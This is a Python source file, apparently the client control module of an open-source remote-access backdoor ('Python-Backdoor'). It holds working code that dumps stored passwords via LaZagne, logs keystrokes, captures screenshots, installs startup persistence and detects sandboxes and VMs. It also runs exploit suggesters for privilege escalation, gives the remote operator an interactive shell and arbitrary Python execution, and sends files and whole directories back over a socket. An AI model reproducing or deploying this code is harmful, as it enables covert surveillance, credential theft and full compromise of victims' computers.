"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import abc
import copy
import os
import platform
import socket
import subprocess
import sys
import logging
import ctypes
import tempfile
from io import BytesIO, StringIO
from pathlib import PurePath

from src import helper, errors
from src.definitions import platforms
from src.logger import LOGGER_ID

if platforms.OS == platforms.LINUX:
    import Xlib
    from PIL import Image

if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
    from src.client.persistence.unix import Unix as Persistence
else:
    import pyscreeze

    from src.client.persistence.windows import Windows as Persistence
    from wes import main as run_wesng

from src.definitions.commands import *
from src.client.keylogger import Keylogger

from lazagne.config.write_output import write_in_file as lazagne_write_file
from lazagne.config.write_output import StandardOutput as lazagne_SO
from lazagne.config.run import run_lazagne
from lazagne.config.constant import constant as lazagne_constant


def get_info():
    _hostname = socket.gethostname()
    _platform = f"{platform.system()} {platform.release()}"

    info = {"hostname": _hostname, "platform": _platform,
            "architecture": platform.architecture(), "machine": platform.machine(), "processor": platform.processor(),
            "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}

    if platforms.OS == platforms.WINDOWS:
        p = Persistence()

        info["username"] = os.environ["USERNAME"]
        info["platform"] += " (Sandboxie) " if p.detect_sandboxie() else ""
        info["platform"] += " (Virtual Machine) " if p.detect_vm() else ""
        info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
        info["is_unix"] = False
    else:
        info["username"] = os.environ["USER"]
        info["is_admin"] = bool(os.geteuid() == 0)
        info["is_unix"] = True

    return info


class Control(metaclass=abc.ABCMeta):
    def __init__(self, _es):
        self.es = _es
        self.keylogger = Keylogger()
        self.disabled_processes = {}

    @abc.abstractmethod
    def inject_shellcode(self, buffer):
        pass

    @abc.abstractmethod
    def toggle_disable_process(self, process, popup):
        pass

    @abc.abstractmethod
    def lock(self):
        pass

    def get_vuln(self, exploit_only):
        if platforms.OS == platforms.DARWIN:
            self.es.send_json(ERROR, "Mac not supported.")
            return

        with tempfile.TemporaryDirectory() as tmp_dir:
            if platforms.OS == platforms.WINDOWS:
                _command_str = "systeminfo"

            elif platforms.OS == platforms.LINUX:
                path = f"{helper.get_submodule_path('linux-exploit-suggester')}/linux-exploit-suggester.sh"
                new_path = f"{tmp_dir}/les.sh"

                # https://stackoverflow.com/a/58363237
                with open(new_path, "w") as new_file:
                    with open(path, "r") as orig:
                        for line in orig:
                            line = line.replace('\r\n', '\n')
                            new_file.write(line)

                _command_str = f"chmod +x {new_path} && {new_path}"
            else:
                self.es.send_json(ERROR, "Platform not supported.")
                return

            _command = subprocess.Popen(_command_str, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE, shell=True)
            output = helper.decode(_command.stdout.read() + _command.stderr.read())

            if platforms.OS == platforms.WINDOWS:
                systeminfo_file = f"{tmp_dir}/systeminfo.txt"

                file = open(systeminfo_file, "w")
                file.write(output)
                file.close()

                args = {'perform_update': True,
                        'definitions': 'definitions.zip',
                        'installedpatch': '',
                        'usekbdate': False,
                        'only_exploits': exploit_only,
                        'hiddenvuln': '',
                        'impacts': '',
                        'severities': '',
                        'outputfile': None,  # just read stdout
                        'muc_lookup': False,
                        'operating_system': None,
                        'showcolor': False,
                        'perform_wesupdate': False,
                        'showversion': True,
                        'missingpatches': None,
                        'qfefile': None,
                        'debugsupersedes': '',
                        'verbosesupersedes': False,
                        'systeminfo': systeminfo_file}

                old_stdout = sys.stdout

                # capture stdout for sending back to server
                sys.stdout = stdout = StringIO()

                try:
                    run_wesng(args, tmp_dir)
                except Exception as e:
                    sys.stdout = old_stdout
                    self.es.send_json(ERROR, f"Failed to retrieve: {e}")
                    return

                stdout.seek(0)
                sys.stdout = old_stdout
                rsp = stdout.read()
            else:
                rsp = output

            self.es.sendall_json(SUCCESS, rsp)

    # laZagne password dump
    def password_dump(self, password=None):
        with tempfile.TemporaryDirectory() as tmp:
            # backup original lazagne 'constant'
            orig_const = {}
            for attribute in dir(lazagne_constant):
                if attribute.startswith("__") and attribute.endswith("__"):
                    continue
                orig_const[attribute] = copy.deepcopy(getattr(lazagne_constant, attribute))

            lazagne_constant.st = lazagne_SO()
            lazagne_constant.output = 'txt'
            lazagne_constant.folder_name = tmp

            level = logging.getLogger(LOGGER_ID).level

            if level == logging.DEBUG:
                lazagne_constant.quiet_mode = False
            else:
                lazagne_constant.quiet_mode = True

            out = StringIO()
            formatter = logging.Formatter(fmt='%(message)s')
            stream = logging.StreamHandler(out)
            stream.setFormatter(formatter)
            root = logging.getLogger(__name__)
            root.setLevel(level)

            for r in root.handlers:
                r.setLevel(logging.CRITICAL)
            root.addHandler(stream)

            lazagne_constant.st.first_title()

            if platforms.OS in [platforms.WINDOWS, platforms.DARWIN]:
                lazagne_constant.user_password = password

                for _ in run_lazagne(category_selected="all", subcategories={password: password}, password=password):
                    pass
            else:
                for _ in run_lazagne(category_selected="all", subcategories={}):
                    pass

            lazagne_write_file(lazagne_constant.stdout_result)

            # reset the lazagne 'constant'
            for key in orig_const:
                setattr(lazagne_constant, key, orig_const[key])

            # find file in the tmp dir and send it
            for it in os.scandir(tmp):
                if not it.is_dir() and it.path.endswith(".txt"):
                    # send file using helper function
                    self.send_file(it.path)
                    return

            self.es.send_json(ERROR, "Error getting results file.")

    def add_startup(self, remove=False):
        p = Persistence()

        try:
            if remove:
                p.remove_from_startup()
            else:
                p.add_startup()

            self.es.send_json(SUCCESS)
        except errors.ClientSocket.Persistence.StartupError as e:
            self.es.send_json(ERROR, str(e))
        except NotImplemented:
            self.es.send_json(ERROR, "Command not supported")

    def heartbeat(self):
        self.es.send_json(SUCCESS)

    def close(self):
        self.es.socket.close()
        sys.exit(0)

    def keylogger_dump(self):
        try:
            self.es.sendall_json(SUCCESS, helper.decode(self.keylogger.dump_logs().encode()))
        except errors.ClientSocket.KeyloggerError as e:
            self.es.send_json(ERROR, str(e))

    def keylogger_start(self):
        self.keylogger.start()

    def keylogger_stop(self):
        try:
            self.keylogger.stop()
            self.es.send_json(SUCCESS)
        except errors.ClientSocket.KeyloggerError as e:
            self.es.send_json(ERROR, str(e))

    def screenshot(self):
        if platforms.OS == platforms.LINUX:
            try:
                dsp = Xlib.display.Display()

                root = dsp.screen().root
                desktop = root.get_geometry()
                w = desktop.width
                h = desktop.height

                raw_byt = root.get_image(0, 0, w, h, Xlib.X.ZPixmap, 0xffffffff)
                image = Image.frombuffer("RGB", (w, h), raw_byt.data, "raw", "BGRX")

                dsp.close()
            except Exception as e:
                self.es.send_json(ERROR, str(e))
                return
        else:
            image = pyscreeze.screenshot()

        with BytesIO() as _bytes:
            image.save(_bytes, format="PNG")
            image_bytes = _bytes.getvalue()

        self.es.sendall_json(SUCCESS, image_bytes, len(image_bytes), is_bytes=True)

    def run_command(self, command):
        _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    shell=True)
        output = _command.stdout.read() + _command.stderr.read()

        self.es.sendall_json(SUCCESS, helper.decode(output))

    def command_shell(self):
        orig_dir = os.getcwd()

        self.es.send_json(SERVER_SHELL_DIR, orig_dir)

        while True:
            data = self.es.recv_json()

            if data["key"] == SERVER_SHELL_CMD:
                command_request = data["value"]

                # check for windows chdir
                if platforms.OS == platforms.WINDOWS and command_request[:5].lower() == "chdir":
                    command_request = command_request.replace("chdir", "cd", 1)

                if command_request[:3].lower() == "cd ":
                    cwd = ' '.join(command_request.split(" ")[1:])

                    try:
                        command = subprocess.Popen('cd' if platforms.OS == platforms.WINDOWS else 'pwd', cwd=cwd,
                                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                   stdin=subprocess.PIPE, shell=True)
                    except FileNotFoundError as e:
                        self.es.sendall_json(SERVER_COMMAND_RSP, str(e))
                    else:
                        if command.stderr.read().decode() == "":  # if there is no error
                            output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                            os.chdir(output)  # change directory

                            self.es.send_json(SERVER_SHELL_DIR, os.getcwd())
                        else:
                            self.es.send_json(SERVER_COMMAND_RSP, helper.decode(command.stderr.read()))
                else:
                    command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE,
                                               shell=True)
                    output = command.stdout.read() + command.stderr.read()

                    self.es.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))

            elif data["key"] == SERVER_SHELL_LEAVE:
                os.chdir(orig_dir)  # change directory back to original
                break

    def download(self, buffer, file_path):
        output = self.es.recvall(buffer)

        file_path = os.path.normpath(file_path)

        try:
            with open(file_path, "wb") as file:
                file.write(output)

            self.es.send_json(SUCCESS, f"Total bytes received by client: {len(output)}")
        except Exception as e:
            self.es.send_json(ERROR, f"Could not open file {e}")

    def upload(self, file):
        file = os.path.normpath(file)

        try:
            with open(file, "rb") as _file:
                data = _file.read()

            self.es.sendall_json(SUCCESS, data, len(data), is_bytes=True)
        except Exception as e:
            self.es.send_json(ERROR, f"Error reading file {e}")

    def upload_dir(self, _dir):
        _dir = os.path.normpath(_dir)

        if not os.path.isdir(_dir):
            self.es.send_json(SERVER_UPLOAD_DIR_DONE, f"Directory does not exist")
        elif not os.access(_dir, os.R_OK):
            self.es.send_json(SERVER_UPLOAD_DIR_DONE, f"Cannot read directory, check permissions")
        else:
            parents = len(PurePath(_dir).parts) - 1

            file_total_size = 0
            completed_size = 0

            # count total file size for determining progress
            for subdir, _, files in os.walk(_dir):
                for _file in files:
                    file_total_size += os.stat(os.path.join(subdir, _file)).st_size

            for subdir, _, files in os.walk(_dir):
                for _file in files:
                    _file = os.path.normpath(os.path.join(subdir, _file))
                    completed_size += os.stat(os.path.join(subdir, _file)).st_size

                    try:
                        with open(_file, "rb") as fread:
                            data = fread.read()
                    except Exception:
                        self.es.send_json(ERROR, f"Could not read file: {_file}")
                    else:
                        _path = (os.path.sep).join(_file.split(os.path.sep)[parents + 1:])

                        self.es.sendall_json(SERVER_UPLOAD_DIR, data, {"size": len(data), "path": _path,
                            "progress": round(completed_size / file_total_size * 100)}, is_bytes=True)

                    rsp = self.es.recv_json()

                    if rsp["key"] == SUCCESS:
                        continue
                    else:
                        return

            self.es.send_json(SERVER_UPLOAD_DIR_DONE)

    def python_interpreter(self):
        while True:
            command = self.es.recv_json()

            if command["key"] == SERVER_PYTHON_INTERPRETER_CMD:
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()

                try:
                    exec(command["value"])
                    print()
                    error = None
                except Exception as e:
                    error = f"{e.__class__.__name__}: "
                    try:
                        error += f"{e.args[0]}"
                    except Exception:
                        pass
                finally:
                    sys.stdout = old_stdout

                if error:
                    self.es.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
                else:
                    self.es.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
                                         helper.decode(redirected_output.getvalue().encode()))
            elif command["key"] == SERVER_PYTHON_INTERPRETER_LEAVE:
                break
